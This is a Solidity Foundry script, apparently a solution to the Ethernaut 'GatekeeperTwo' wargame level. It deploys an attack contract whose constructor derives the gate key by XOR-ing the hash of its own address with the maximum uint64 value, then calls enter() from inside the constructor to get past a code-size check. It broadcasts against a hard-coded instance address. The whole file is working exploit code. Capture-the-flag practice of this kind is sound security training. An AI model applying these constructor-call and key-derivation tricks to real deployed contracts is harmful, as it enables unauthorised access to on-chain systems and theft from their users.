//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract GatekeeperTwoAttack {

  

  constructor(GatekeeperTwo _gateKeeperTwoInstance ) {
    bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^  bytes8(type(uint64).max);
      _gateKeeperTwoInstance.enter(gateKey);
      console.log(_gateKeeperTwoInstance.entrant());
  }
 

}

contract GatekeeperTwoSolution is Script {

GatekeeperTwo gateKeeperTwoInstance = GatekeeperTwo(0xc90b17dc12a58964c0877a5f11aB6693D10Cab41);
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
   new GatekeeperTwoAttack(gateKeeperTwoInstance);
    vm.stopBroadcast();
  }
}